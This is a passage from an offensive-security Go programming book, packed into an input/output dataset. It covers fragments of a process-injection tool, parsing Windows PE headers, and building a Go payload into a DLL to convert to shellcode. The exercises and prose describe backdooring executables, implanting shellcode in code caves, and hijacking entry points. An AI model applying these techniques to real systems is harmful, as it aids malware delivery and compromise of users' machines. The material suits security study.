{\nvar dwMilliseconds uint32 = INFINITE\nvar dwExitCode uint32\nrWaitValue, _, lastErr := ProcWaitForSingleObject.Call( ❶\ni.RThread, // HANDLE hHandle\nuintptr(dwMilliseconds)) // DWORD dwMilliseconds\nif rWaitValue != 0 {\nreturn errors.Wrap(lastErr, \"[!] ERROR : Error returning thread wait state.\")\n}\nsuccess, _, lastErr := ProcGetExitCodeThread.Call( ❷\ni.RThread, // HANDLE hThread\nuintptr(unsafe.Pointer(&dwExitCode))) // LPDWORD lpExitCode\nif success == 0 {\nreturn errors.Wrap(lastErr, \"[!] ERROR : Error returning thread exit code.\")\n}\nclosed, _, lastErr := ProcCloseHandle.Call(i.RThread) // HANDLE hObject ❸\nif closed == 0 {\nreturn errors.Wrap(lastErr, \"[!] ERROR : Error closing thread handle.\")\n}\nreturn nil\n}\nListing 12-12: Using the WaitforSingleObject() Windows function to ensure successful\nthread execution (/ch-12/procInjector/winsys/inject.go)\nThree notable events are occurring in this code block. First,\nthe ProcWaitForSingleObject.Call() system call ❶ is passed the thread\nhandle returned in Listing 12-11. A wait value of INFINITE is\npassed as the second argument to declare an infinite expiration\ntime associated with the event.\nNext, ProcGetExitCodeThread.Call() ❷ determines whether the\nthread terminated successfully. If it did, the LoadLibraryA\nfunction should have been called, and our DLL will have been\nexecuted. Finally, as we do for the responsible cleanup of\nalmost any handle, we passed the ProcCloseHandle.Call() system\ncall ❸ so that that thread object handle closes cleanly.\nCleaning Up with the VirtualFreeEx Windows API\nWe use the VirtualFreeEx() Windows function to release, or\ndecommit, the virtual memory that we allocated in Listing 12-\n8 via VirtualAllocEx(). This is necessary to clean up memory\nresponsibly, since initialized memory regions can be rather\nlarge, considering the overall size of the code being injected\ninto the remote process, such as an entire DLL. Let’s take a\nlook at this block of code (Listing 12-13).\nfunc VirtualFreeEx(i *Inject) error {\nvar dwFreeType uint32 = MEM_RELEASE\nvar size uint32 = 0 //Size must be 0 to MEM_RELEASE all of the region\nrFreeValue, _, lastErr := ProcVirtualFreeEx.Call❶(\ni.RemoteProcHandle, // HANDLE hProcess ❷\ni.Lpaddr, // LPVOID lpAddress ❸\nuintptr(size), // SIZE_T dwSize ❹\nuintptr(dwFreeType)) // DWORD dwFreeType ❺\nif rFreeValue == 0 {\nreturn errors.Wrap(lastErr, \"[!] ERROR : Error freeing process memory.\")\n}\nfmt.Println(\"[+] Success: Freed memory region\")\nreturn nil\n}\nListing 12-13: Freeing virtual memory by using the VirtualFreeEx() Windows function\n(/ch-12/procInjector /winsys/inject.go)\nThe ProcVirtualFreeEx.Call() function ❶ takes four arguments.\nThe first is the remote process handle ❷ associated with the\nprocess that is to have its memory freed. The next argument is\na pointer ❸ to the location of memory to be freed.\nNotice that a variable named size ❹ is assigned a 0 value.\nThis is necessary, as defined within the Windows API\nspecification, to release the entire region of memory back into\na reclaimable state. Finally, we pass the MEM_RELEASE\noperation ❺ to completely free the process memory (and our\ndiscussion on process injection).\nAdditional Exercises\nLike many of the other chapters in this book, this chapter will\nprovide the most value if you code and experiment along the\nway. Therefore, we conclude this section with a few\nchallenges or possibilities to expand upon the ideas already\ncovered:\nOne of the most important aspects of creating code injection is maintaining a\nusable tool chain sufficient for inspecting and debugging process execution.\nDownload and install both the Process Hacker and Process Monitor tools. Then,\nusing Process Hacker, locate the memory addresses of both Kernel32 and\nLoadLibrary. While you’re at it, locate the process handle and take a look at the\nintegrity level, along with inherent privileges. Now inject your code into the\nsame victim process and locate the thread.\nYou can expand the process injection example to be less trivial. For example,\ninstead of loading the payload from a disk file path, use MsfVenom or Cobalt\nStrike to generate shellcode and load it directly into process memory. This will\nrequire you to modify VirtualAllocEx and LoadLibrary.\nCreate a DLL and load the entire contents into memory. This is similar to the\nprevious exercise: the exception is that you’ll be loading an entire DLL rather\nthan shellcode. Use Process Monitor to set a path filter, process filter, or both,\nand observe the system DLL load order. What prevents DLL load order\nhijacking?\nYou can use a project called Frida (https://www.frida.re/) to inject the Google\nChrome V8 JavaScript engine into the victim process. It has a strong following\nwith mobile security practitioners as well as developers: you can use it to\nperform runtime analysis, in-process debugging, and instrumentation. You can"
  },
  {
    "input": "The Portable Executable File",
    "output": "also use Frida with other operating systems, such as Windows. Create your own\nGo code, inject Frida into a victim process, and use Frida to run JavaScript\nwithin the same process. Becoming familiar with the way Frida works will\nrequire some research, but we promise it’s well worth it.\nTHE PORTABLE EXECUTABLE FILE\nSometimes we need a vehicle to deliver our malicious code.\nThis could be a newly minted executable (delivered through an\nexploit in preexisting code), or a modified executable that\nalready exists on the system, for example. If we wanted to\nmodify an existing executable, we would need to understand\nthe structure of the Windows Portable Executable (PE) file\nbinary data format, as it dictates how to construct an\nexecutable, along with the executable’s capabilities. In this\nsection, we’ll cover both the PE data structure and Go’s PE\npackage, and build a PE binary parser, which you can use to\nnavigate the structure of a PE binary.\nUnderstanding the PE File Format\nFirst, let’s discuss the PE data structure format. The Windows\nPE file format is a data structure most often represented as an\nexecutable, object code, or a DLL. The PE format also\nmaintains references for all resources used during the initial\noperating system loading of the PE binary, including the\nexport address table (EAT) used to maintain exported\nfunctions by ordinal, the export name table used to maintain\nexported functions by name, the import address table (IAT),\nimport name table, thread local storage, and resource\nmanagement, among other structures. You can find the PE\nformat specification at https://docs.microsoft.com/en-\nus/windows/win32/debug/pe-format/. Figure 12-6 shows the\nPE data structure: a visual representation of a Windows\nbinary.\nFigure 12-6: The Windows PE file format\nWe will examine each of these top-down sections as we\nbuild out the PE parser.\nWriting a PE Parser\nThroughout the following sections, we will write the\nindividual parser components necessary to analyze each PE\nsection within the Windows binary executable. As an example,\nwe’ll use the PE format associated with the Telegram\nmessaging application binary located at https://telegram.org,\nsince this app is both less trivial than the often overused putty\nSSH binary example, and is distributed as a PE format. You\ncan use almost any Windows binary executable, and we\nHivaNetwork.Com\nencourage you to investigate others.\nLoading the PE binary and File I/O\nIn Listing 12-14, we’ll start by using the Go PE package to\nprepare the Telegram binary for further parsing. You can place\nall the code that we create when writing this parser in a single\nfile within a main() function.\nimport (\n❶ \"debug/pe\"\n\"encoding/binary\"\n\"fmt\"\n\"io\"\n\"log\"\n\"os\"\n)\nfunc main() {\n❷ f, err := os.Open(\"Telegram.exe\")\ncheck(err)\n❸ pefile, err := pe.NewFile(f)\ncheck(err)\ndefer f.Close()\ndefer pefile.Close()\nListing 12-14: File I/O for PE binary (/ch-12/peParser/main.go)\nPrior to reviewing each of the PE structure components, we\nneed to stub out the initial import ❶ and file I/O by using the\nGo PE package. We use os.Open() ❷ and then pe.NewFile() ❸ to\ncreate a file handle and a PE file object, respectively. This is\nnecessary because we intend to parse the PE file contents by\nusing a Reader object, such as a file or binary reader.\nParsing the DOS Header and the DOS Stub\nThe first section of the top-down PE data structure illustrated\nin Figure 12-6 starts with a DOS header. The following unique\nvalue is always present within any Windows DOS-based\nexecutable binary: 0x4D 0x5A (or MZ in ASCII), which aptly\ndeclares the file as a Windows executable. Another value\nuniversally present on all PE files is located at offset 0x3C. The\nvalue at this offset points to another offset containing the\nsignature of a PE file: aptly, 0x50 0x45 0x00 0x00 (or PE in ASCII).\nThe header that immediately follows is the DOS Stub,\nwhich always provides the hex values for This program cannot be run\nin DOS mode; the exception to this occurs when a compiler’s\n/STUB linker option provides an arbitrary string value. If you\ntake your favorite hex editor and open the Telegram\napplication, it should be similar to Figure 12-7. All of these\nvalues are present.\nFigure 12-7: A typical PE binary format file header\nSo far, we have described the DOS Header and Stub while\nalso looking at the hexadecimal representation through a hex\neditor. Now, let’s take a look at parsing those same values\nwith Go code, as provided in Listing 12-15.\ndosHeader := make([]byte, 96)\nsizeOffset := make([]byte, 4)\n// Dec to Ascii (searching for MZ)\n_, err = f.Read(dosHeader) ❶\ncheck(err)\nfmt.Println(\"[-----DOS Header / Stub-----]\")\nfmt.Printf(\"[+] Magic Value: %s%s\\n\", string(dosHeader[0]),\nstring(dosHeader[1])) ❷\n// Validate PE+0+0 (Valid PE format)\npe_sig_offset := int64(binary.LittleEndian.Uint32(dosHeader[0x3c:])) ❸\nf.ReadAt(sizeOffset[:], pe_sig_offset) ❹\nfmt.Println(\"[-----Signature Header-----]\")\nfmt.Printf(\"[+] LFANEW Value: %s\\n\", string(sizeOffset))\n/* OUTPUT\n[-----DOS Header / Stub-----]\n[+] Magic Value: MZ\n[-----Signature Header-----]\n[+] LFANEW Value: PE\n*/\nListing 12-15: Parsing the DOS Header and Stub values (/ch-12/peParser/main.go)\nStarting from the beginning of the file, we use a Go file\nReader ❶ instance to read 96 bytes onward in order to confirm\nthe initial binary signature ❷. Recall that the first 2 bytes\nprovide the ASCII value MZ. The PE package offers\nconvenience objects to help marshal PE data structures into\nsomething more easily consumable. It will, however, still\nrequire manual binary readers and bitwise functionality to get\nit there. We perform a binary read of the offset value ❸\nreferenced at 0x3c, and then read exactly 4 bytes ❹ composed\nof the value 0x50 0x45 (PE) followed by 2 0x00 bytes.\nParsing the COFF File Header\nContinuing down the PE file structure, and immediately\nfollowing the DOS Stub, is the COFF File Header. Let’s parse\nthe COFF File Header by using the code defined in Listing 12-\n16, and then discuss some of its more interesting properties.\n// Create the reader and read COFF Header\n❶ sr := io.NewSectionReader(f, 0, 1<<63-1)\n❷ _, err := sr.Seek(pe_sig_offset+4, os.SEEK_SET)\ncheck(err)\n❸ binary.Read(sr, binary.LittleEndian, &pefile.FileHeader)\nListing 12-16: Parsing the COFF File Header (/ch-12/peParser/main.go)\nWe create a new SectionReader ❶ that starts from the\nbeginning of the file at position 0 and reads to the max value\nof an int64. Then the sr.Seek() function ❷ resets the position to\nstart reading immediately, following the PE signature offset\nand value (recall the literal values PE + 0x00 + 0x00). Finally, we\nperform a binary read ❸ to marshal the bytes into the pefile\nobject’s FileHeader struct. Recall that we created pefile earlier\nwhen we called pe.Newfile().\nThe Go documentation defines type FileHeader with the struct\ndefined in Listing 12-17. This struct aligns quite well with\nMicrosoft’s documented PE COFF File Header format\n(defined at https://docs.microsoft.com/en-\nus/windows/win32/debug/pe-format#coff-file-header-object-\nand-image/).\ntype FileHeader struct {\nMachine uint16\nNumberOfSections uint16\nTimeDateStamp uint32\nPointerToSymbolTable uint32\nNumberOfSymbols uint32\nSizeOfOptionalHeader uint16\nCharacteristics uint16\n}\nListing 12-17: The Go PE package’s native PE File Header struct\nThe single item to note in this struct outside of the Machine\nvalue (in other words, the PE target system architecture), is the\nNumberOfSections property. This property contains the number of\nsections defined within the Section Table, which immediately\nfollows the headers. You’ll need to update the NumberOfSections\nvalue if you intend to backdoor a PE file by adding a new\nsection. However, other strategies may not require updating\nthis value, such as searching other executable sections (such as\nCODE, .text, and so on) for contiguous unused 0x00 or 0xCC\nvalues (a method to locate sections of memory that you can\nuse to implant shellcode), as the number of sections remain\nunchanged.\nIn closing, you can use the following print statements to\noutput some of the more interesting COFF File Header values\n(Listing 12-18).\n// Print File Header\nfmt.Println(\"[-----COFF File Header-----]\")\nfmt.Printf(\"[+] Machine Architecture: %#x\\n\", pefile.FileHeader.Machine)\nfmt.Printf(\"[+] Number of Sections: %#x\\n\",\npefile.FileHeader.NumberOfSections)\nfmt.Printf(\"[+] Size of Optional Header: %#x\\n\",\npefile.FileHeader.SizeOfOptionalHeader)\n// Print section names\nfmt.Println(\"[-----Section Offsets-----]\")\nfmt.Printf(\"[+] Number of Sections Field Offset: %#x\\n\", pe_sig_offset+6) ❶\n// this is the end of the Signature header (0x7c) + coff (20bytes) + oh32\n(224bytes)\nfmt.Printf(\"[+] Section Table Offset: %#x\\n\", pe_sig_offset+0xF8)\n/* OUTPUT\n[-----COFF File Header-----]\n[+] Machine Architecture: 0x14c ❷\n[+] Number of Sections: 0x8 ❸\n[+] Size of Optional Header: 0xe0 ❹\n[-----Section Offsets-----]\n[+] Number of Sections Field Offset: 0x15e ❺\n[+] Section Table Offset: 0x250 ❻\n*/\nListing 12-18: Writing COFF File Header values to terminal output (/ch-\n12/peParser/main.go)\nYou can locate the NumberOfSections value by calculating the\noffset of the PE signature + 4 bytes + 2 bytes—in other words,\nby adding 6 bytes. In our code, we already defined pe_sig_offset,\nso we’d just add 6 bytes to that value ❶. We’ll discuss\nsections in more detail when we examine the Section Table\nstructure.\nThe produced output describes the Machine Architecture ❷\nvalue of 0x14c: an IMAGE_FILE_MACHINE_I386 as detailed in\nhttps://docs.microsoft.com/en-us/windows/win32/debug/pe-\nformat#machine-types. The number of sections ❸ is 0x8,\ndictating that eight entries exist within the Section Table. The\nOptional Header (which will be discussed next) has a variable\nlength depending on architecture: the value is 0xe0 (224 in\ndecimal), which corresponds to a 32-bit system ❹. The last\ntwo sections can be considered more of convenience output.\nSpecifically, the Sections Field Offset ❺ provides the offset to the\nnumber of sections, while the Section Table Offset ❻ provides the\noffset for the location of the Section Table. Both offset values\nwould require modification if adding shellcode, for example.\nParsing the Optional Header\nThe next header in the PE file structure is the Optional\nHeader. An executable binary image will have an Optional\nHeader that provides important data to the loader, which loads\nthe executable into virtual memory. A lot of data is contained\nwithin this header, so we’ll cover only a few items in order to\nget you used to navigating this structure.\nTo get started, we need to perform a binary read of the\nrelevant byte length based on architecture, as described in\nListing 12-19. If you were writing more comprehensive code,\nyou’d want to check architectures (for example, x86 versus\nx86_64) throughout in order to use the appropriate PE data\nstructures.\n// Get size of OptionalHeader\n❶ var sizeofOptionalHeader32 = uint16(binary.Size(pe.OptionalHeader32{}))\n❷ var sizeofOptionalHeader64 = uint16(binary.Size(pe.OptionalHeader64{}))\n❸ var oh32 pe.OptionalHeader32\n❹ var oh64 pe.OptionalHeader64\n// Read OptionalHeader\nswitch pefile.FileHeader.SizeOfOptionalHeader {\ncase sizeofOptionalHeader32:\n❺ binary.Read(sr, binary.LittleEndian, &oh32)\ncase sizeofOptionalHeader64:\nbinary.Read(sr, binary.LittleEndian, &oh64)\n}\nListing 12-19: Reading the Optional Header bytes (/ch-12/peParser/main.go)\nIn this code block, we’re initializing two variables,\nsizeOfOptionalHeader32 ❶ and sizeOfOptionalHeader64 ❷, with 224\nbytes and 240 bytes, respectively. This is an x86 binary, so\nwe’ll use the former variable in our code. Immediately\nfollowing the variable declarations are initializations of\npe.OptionalHeader32 ❸ and pe.OptionalHeader64 ❹ interfaces, which\nwill contain the OptionalHeader data. Finally, we perform the\nbinary read ❺ and marshal it to the relevant data structure: the\noh32 based on a 32-bit binary.\nLet’s describe some of the more notable items of the\nOptional Header. The corresponding print statements and\nsubsequent output are provided in Listing 12-20.\n// Print Optional Header\nfmt.Println(\"[-----Optional Header-----]\")\nfmt.Printf(\"[+] Entry Point: %#x\\n\", oh32.AddressOfEntryPoint)\nfmt.Printf(\"[+] ImageBase: %#x\\n\", oh32.ImageBase)\nfmt.Printf(\"[+] Size of Image: %#x\\n\", oh32.SizeOfImage)\nfmt.Printf(\"[+] Sections Alignment: %#x\\n\", oh32.SectionAlignment)\nfmt.Printf(\"[+] File Alignment: %#x\\n\", oh32.FileAlignment)\nfmt.Printf(\"[+] Characteristics: %#x\\n\", pefile.FileHeader.Characteristics)\nfmt.Printf(\"[+] Size of Headers: %#x\\n\", oh32.SizeOfHeaders)\nfmt.Printf(\"[+] Checksum: %#x\\n\", oh32.CheckSum)\nfmt.Printf(\"[+] Machine: %#x\\n\", pefile.FileHeader.Machine)\nfmt.Printf(\"[+] Subsystem: %#x\\n\", oh32.Subsystem)\nfmt.Printf(\"[+] DLLCharacteristics: %#x\\n\", oh32.DllCharacteristics)\n/* OUTPUT\n[-----Optional Header-----]\n[+] Entry Point: 0x169e682 ❶\n[+] ImageBase: 0x400000 ❷\n[+] Size of Image: 0x3172000 ❸\n[+] Sections Alignment: 0x1000 ❹\n[+] File Alignment: 0x200 ❺\n[+] Characteristics: 0x102\n[+] Size of Headers: 0x400\n[+] Checksum: 0x2e41078\n[+] Machine: 0x14c\n[+] Subsystem: 0x2\n[+] DLLCharacteristics: 0x8140\n*/\nListing 12-20: Writing Optional Header values to terminal output (/ch-\n12/peParser/main.go)\nAssuming that the objective is to backdoor a PE file, you’ll\nneed to know both the ImageBase ❷ and Entry Point ❶ in order to\nhijack and memory jump to the location of the shellcode or to\na new section defined by the number of Section Table entries. The\nImageBase is the address of the first byte of the image once it is\nloaded into memory, whereas the Entry Point is the address of the\nexecutable code relative to the ImageBase. The Size of Image ❸ is\nthe actual size of the image, in its entirety, when loaded into\nmemory. This value will need to be adjusted to accommodate\nany increase in image size, which could happen if you added a\nnew section containing shellcode.\nThe Sections Alignment ❹ will provide the byte alignment\nwhen sections are loaded into memory: 0x1000 is a rather\nstandard value. The File Alignment ❺ provides the byte\nalignment of the sections on raw disk: 0x200 (512K) is also a\ncommon value. You’ll need to modify these values in order to\nget working code, and you’ll have to use a hex editor and a\ndebugger if you’re planning to perform all this manually.\nThe Optional Header contains numerous entries. Instead of\ndescribing every single one of them, we recommend that you\nexplore the documentation at https://docs.microsoft.com/en-\nus/windows/win32/debug/pe-format#optional-header-\nwindows-specific-fields-image-only to gain a comprehensive\nunderstanding of each entry.\nParsing the Data Directory\nAt runtime, the Windows executable must know important\ninformation, such as how to consume a linked DLL or how to\nallow other application processes to consume resources that\nthe executable has to offer. The binary also needs to manage\ngranular data, such as thread storage. This is the primary\nfunction of the Data Directory.\nThe Data Directory is the last 128 bytes of the Optional\nHeader and pertains specifically to a binary image. We use it\nHivaNetwork.Com\nto maintain a table of references containing both an individual\ndirectory’s offset address to the data location and the size of\nthe data. Exactly 16 directory entries are defined within the\nWINNT.H header, which is a core Windows header file that\ndefines various data types and constants to be used throughout\nthe Windows operating system.\nNote that not all of the directories are in use, as some are\nreserved or unimplemented by Microsoft. The entire list of\ndata directories and details of their intended use can be\nreferenced at https://docs.microsoft.com/en-\nus/windows/win32/debug/pe-format#optional-header-data-\ndirectories-image-only. Again, a lot of information is\nassociated with each individual directory, so we recommend\nyou take some time to really research and get familiar with\ntheir structures.\nLet’s explore a couple of directory entries within the Data\nDirectory by using the code in Listing 12-21.\n// Print Data Directory\nfmt.Println(\"[-----Data Directory-----]\")\nvar winnt_datadirs = []string{ ❶\n\"IMAGE_DIRECTORY_ENTRY_EXPORT\",\n\"IMAGE_DIRECTORY_ENTRY_IMPORT\",\n\"IMAGE_DIRECTORY_ENTRY_RESOURCE\",\n\"IMAGE_DIRECTORY_ENTRY_EXCEPTION\",\n\"IMAGE_DIRECTORY_ENTRY_SECURITY\",\n\"IMAGE_DIRECTORY_ENTRY_BASERELOC\",\n\"IMAGE_DIRECTORY_ENTRY_DEBUG\",\n\"IMAGE_DIRECTORY_ENTRY_COPYRIGHT\",\n\"IMAGE_DIRECTORY_ENTRY_GLOBALPTR\",\n\"IMAGE_DIRECTORY_ENTRY_TLS\",\n\"IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG\",\n\"IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT\",\n\"IMAGE_DIRECTORY_ENTRY_IAT\",\n\"IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT\",\n\"IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR\",\n\"IMAGE_NUMBEROF_DIRECTORY_ENTRIES\",\n}\nfor idx, directory := range oh32.DataDirectory { ❷\nfmt.Printf(\"[!] Data Directory: %s\\n\", winnt_datadirs[idx])\nfmt.Printf(\"[+] Image Virtual Address: %#x\\n\", directory.VirtualAddress)\nfmt.Printf(\"[+] Image Size: %#x\\n\", directory.Size)\n}\n/* OUTPUT\n[-----Data Directory-----]\n[!] Data Directory: IMAGE_DIRECTORY_ENTRY_EXPORT ❸\n[+] Image Virtual Address: 0x2a7b6b0 ❹\n[+] Image Size: 0x116c ❺\n[!] Data Directory: IMAGE_DIRECTORY_ENTRY_IMPORT ❻\n[+] Image Virtual Address: 0x2a7c81c\n[+] Image Size: 0x12c\n--snip--\n*/\nListing 12-21: Parsing the Data Directory for address offset and size (/ch-\n12/peParser/main.go)\nThe Data Directory list ❶ is statically defined by\nMicrosoft, meaning that the literal individual directory names\nwill remain in a consistently ordered list. As such, they are\nconsidered to be constants. We will use a slice variable,\nwinnt_datadirs, to store the individual directory entries so we can\nreconcile names to index positions. Specifically, the Go PE\npackage implements the Data Directory as a struct object, so\nwe’re required to iterate over each entry to extract the\nindividual directory entries, along with their respective address\noffset and size attributes. The for loop is 0-index based, so we\njust output each slice entry relative to its index position ❷.\nThe directory entries being displayed to standard output are\nthe IMAGE_DIRECTORY_ENTRY_EXPORT ❸, or the EAT, and the\nIMAGE_DIRECTORY_ENTRY_IMPORT ❻, or the IAT. Each of these\ndirectories maintains a table of exported and imported\nfunctions, respectively, relative to the running Windows\nexecutable. Looking further at\nIMAGE_DIRECTORY_ENTRY_EXPORT, you will see the virtual\naddress ❹ containing the offset of the actual table data, along\nwith the size ❺ of the data contained within.\nParsing the Section Table\nThe Section Table, the last PE byte structure, immediately\nfollows the Optional Header. It contains the details of each\nrelevant section in the Windows executable binary, such as\nexecutable code and initialized data location offsets. The\nnumber of entries matches the NumberOfSections defined within\nthe COFF File Header. You can locate the Section Table at the\nPE signature offset + 0xF8. Let’s take a look at this section\nwithin a hex editor (Figure 12-8).\nFigure 12-8: The Section Table, as observed using a hex editor\nThis particular Section Table starts with .text, but it might\nstart with a CODE section, depending on the binary’s compiler.\nThe .text (or CODE) section contains the executable code,\nwhereas the next section, .rodata, contains read-only constant\ndata. The .rdata section contains resource data, and the .data\nsection contains initialized data. Each section is at least 40\nbytes in length.\nYou can access the Section Table within the COFF File\nHeader. You can also access each section individually, using\nthe code in Listing 12-22.\ns := pefile.Section(\".text\")\nfmt.Printf(\"%v\", *s)\n/* Output\n{{.text 25509328 4096 25509376 1024 0 0 0 0 1610612768} [] 0xc0000643c0\n0xc0000643c0}\n*/\nListing 12-22: Parsing a specific section from the Section Table (/ch-\n12/peParser/main.go)\nThe other option is to iterate over the entire Section Table,\nas shown in Listing 12-23.\nfmt.Println(\"[-----Section Table-----]\")\nfor _, section := range pefile.Sections { ❶\nfmt.Println(\"[+] --------------------\")\nfmt.Printf(\"[+] Section Name: %s\\n\", section.Name)\nfmt.Printf(\"[+] Section Characteristics: %#x\\n\", section.Characteristics)\nfmt.Printf(\"[+] Section Virtual Size: %#x\\n\", section.VirtualSize)\nfmt.Printf(\"[+] Section Virtual Offset: %#x\\n\", section.VirtualAddress)\nfmt.Printf(\"[+] Section Raw Size: %#x\\n\", section.Size)\nfmt.Printf(\"[+] Section Raw Offset to Data: %#x\\n\", section.Offset)\nfmt.Printf(\"[+] Section Append Offset (Next Section): %#x\\n\",\nsection.Offset+section.Size)\n}\n/* OUTPUT\n[-----Section Table-----]\n[+] --------------------\n[+] Section Name: .text ❷\n[+] Section Characteristics: 0x60000020 ❸\n[+] Section Virtual Size: 0x1853dd0 ❹\n[+] Section Virtual Offset: 0x1000 ❺\n[+] Section Raw Size: 0x1853e00 ❻\n[+] Section Raw Offset to Data: 0x400 ❼\n[+] Section Append Offset (Next Section): 0x1854200 ❽\n[+] --------------------\n[+] Section Name: .rodata\n[+] Section Characteristics: 0x60000020\n[+] Section Virtual Size: 0x1b00\n[+] Section Virtual Offset: 0x1855000\n[+] Section Raw Size: 0x1c00\n[+] Section Raw Offset to Data: 0x1854200\n[+] Section Append Offset (Next Section): 0x1855e00\n--snip--\n*/\nListing 12-23: Parsing all sections from a Section Table (/ch-12/peParser/main.go)\nHere, we’re iterating over all the sections within the\nSection Table ❶ and writing the name ❷, virtual size ❹, virtual\naddress ❺, raw size ❻, and raw offset ❼ to standard output. Also,\nwe calculate the next 40-byte offset address ❽ in the event\nthat we’d want to append a new section. The characteristics value\n❸ describes how the section is to behave as part of the binary.\nFor example, the .text section provides a value of 0x60000020.\nReferencing the relevant Section Flags data at\nhttps://docs.microsoft.com/en-us/windows/win32/debug/pe-\nformat#section-flags (Table 12-2), we can see that three\nseparate attributes make up the value.\nTable 12-2: Characteristics of Section Flags\nFlag Value Description\nIMAGE_SCN_CNT 0x00000020 The section contains executable code.\n_CODE\nIMAGE_SCN_MEM 0x20000000 The section can be executed as code.\n_EXECUTE\nIMAGE_SCN_MEM 0x40000000 The section can be read.\n_READ\nThe first value, 0x00000020 (IMAGE_SCN_CNT_CODE), states\nthat the section contains executable code. The second value,\n0x20000000 (IMAGE_SCN_MEM_EXECUTE), states that the section\ncan be executed as code. Lastly, the third value, 0x40000000\n(IMAGE_SCN_MEM_READ), allows the section to be read.\nTherefore, adding all these together provides the value\n0x60000020. If you’re adding a new section, keep in mind that\nyou’ll need to update all these properties with their appropriate\nvalues.\nThis wraps up our discussion of the PE file data structure.\nIt was a brief overview, we know. Each section could be its\nown chapter. However, it should be enough to allow you to\nuse Go as a means to navigate arbitrary data structures. The\nPE data structure is quite involved and it’s well worth the time\nand effort necessary to become familiar with all of its\ncomponents.\nAdditional Exercises\nTake the knowledge you just learned about the PE file data\nstructure and expand upon it. Here are some additional ideas\nthat will help reinforce your understanding, while also\nproviding a chance to explore more of the Go PE package:\nObtain various Windows binaries and use a hex editor and a debugger to explore\nthe various offset values. Identify how various binaries are different, such as\ntheir number of sections. Use the parser that you built in this chapter to both\nexplore and verify your manual observations.\nExplore new areas of the PE file structure, such as the EAT and IAT. Now,\nrebuild the parser to support DLL navigation.\nAdd a new section to an existing PE file to include your shiny new shellcode.\nUpdate the entire section to include the appropriate number of sections, entry\npoint, and raw and virtual values. Do this all over again, but this time, instead of\nadding a new section, use an existing section and create a code cave.\nOne topic that we didn’t discuss was how to handle PE files that have been code\npacked, either with common packers, such as UPX, or more obscure packers."
  },
  {
    "input": "Using C with Go",
    "output": "Find a binary that has been packed, identify how it was packed and what packer\nwas used, and then research the appropriate technique to unpack the code.\nUSING C WITH GO\nAnother method of accessing the Windows API is to leverage\nC. By directly using C, you could take advantage of an\nexisting library that is available only in C, create a DLL\n(which we can’t do using Go alone), or simply call the\nWindows API. In this section, we’ll first install and configure\na C toolchain that is compatible with Go. We will then look at\nexamples of how to use C code in Go programs and how to\ninclude Go code in C programs.\nInstalling a C Windows Toolchain\nTo compile programs that contain a combination of Go and C,\nyou’ll need a suitable C toolchain that can be used to build\nportions of C code. On Linux and macOS, you can install the\nGNU Compiler Collection (GCC) by using a package\nmanager. On Windows, installing and configuring a toolchain\nis a bit more involved and can lead to frustration if you’re not\nfamiliar with the many options available. The best option we\nfound is to use MSYS2, which packages MinGW-w64, a\nproject created to support the GCC toolchain on Windows.\nDownload and install this from https://www.msys2.org/ and\nfollow the instructions on that page to install your C toolchain.\nAlso, remember to add the compiler to your PATH variable.\nCreating a Message Box Using C and the Windows\nAPI\nNow that we have a C toolchain configured and installed, let’s\nlook at a simple Go program that leverages embedded C code.\nListing 12-24 contains C that uses the Windows API to create\na message box, which gives us a visual display of the\nWindows API in use.\npackage main\n❶ /*\n#include <stdio.h>\n#include <windows.h>\n❷ void box()\n{\nMessageBox(0, \"Is Go the best?\", \"C GO GO\", 0x00000004L);\n}\n*/\n❸ import \"C\"\nfunc main() {\n❹ C.box()\n}\nListing 12-24: Go using C (/ch-12/messagebox/main.go)\nC code can be provided through external file include\nstatements ❶. It can also be embedded directly in a Go file.\nHere we are using both methods. To embed C code into a Go\nfile, we use a comment, inside of which we define a function\nthat will create a MessageBox ❷. Go supports comments for\nmany compile-time options, including compiling C code.\nImmediately after the closing comment tag, we use import \"C\" to\ntell the Go compiler to use CGO, a package that allows the Go\ncompiler to link native C code at build time ❸. Within the Go\ncode, we can now call functions defined in C, and we call the\nC.box() function, which executes the function defined in the\nbody of our C code ❹.\nBuild the sample code by using go build. When executed,\nyou should get a message box.\nNOTE\nThough the CGO package is extremely convenient, allowing you to call C\nlibraries from Go code as well as call Go libraries from C code, using it\ngets rid of Go’s memory manager and garbage disposal. If you want to\nreap the benefits of Go’s memory manager, you should allocate memory\nwithin Go and then pass it to C. Otherwise, Go’s memory manager won’t\nknow about allocations you’ve made using the C memory manager, and\nthose allocations won’t be freed unless you call C’s native free() method. Not\nfreeing the memory correctly can have adverse effects on your Go code.\nFinally, just like opening file handles in Go, use defer within your Go function\nto ensure that any C memory that Go references is garbage collected.\nBuilding Go into C\nJust as we can embed C code into Go programs, we can embed\nGo code into C programs. This is useful because, as of this\nwriting, the Go compiler can’t build our programs into DLLs.\nThat means we can’t build utilities such as reflective DLL\ninjection payloads (like the one we created earlier in this\nchapter) with Go alone.\nHowever, we can build our Go code into a C archive file,\nand then use C to build the archive file into a DLL. In this\nsection, we’ll build a DLL by converting our Go code into a C\narchive file. Then we’ll convert that DLL into shellcode by\nusing existing tools, so we can inject and execute it in\nmemory. Let’s start with the Go code (Listing 12-25), saved in\na file called main.go.\npackage main\n❶ import \"C\"\nimport \"fmt\"\n❷ //export Start\nHivaNetwork.Com\n❸ func Start() {\nfmt.Println(\"YO FROM GO\")\n}\n❹ func main() {\n}\nListing 12-25: The Go payload (/ch-12/dllshellcode/main.go)\nWe import C to include CGO into our build ❶. Next, we\nuse a comment to tell Go that we want to export a function in\nour C archive ❷. Finally, we define the function we want to\nconvert into C ❸. The main() function ❹ can remain empty.\nTo build the C archive, execute the following command:\n> go build -buildmode=c-archive\nWe should now have two files, an archive file called\ndllshellcode.a and an associated header file called\ndllshellcode.h. We can’t use these quite yet. We have to build\na shim in C and force the compiler to include dllshellcode.a.\nOne elegant solution is to use a function table. Create a file\nthat contains the code in Listing 12-26. Call this file scratch.c.\n#include \"dllshellcode.h\"\nvoid (*table[1]) = {Start};\nListing 12-26: A function table saved in the scratch.c file (/ch-\n12/dllshellcode/scratch.c)\nWe can now use GCC to build the scratch.c C file into a\nDLL by using the following command:\n> gcc -shared -pthread -o x.dll scratch.c dllshellcode.a -lWinMM -lntdll -\nlWS2_32\nTo convert our DLL into shellcode, we’ll use sRDI\n(https://github.com/monoxgas/sRDI/), an excellent utility that\nhas a ton of functionality. To begin, download the repo by\nusing Git on 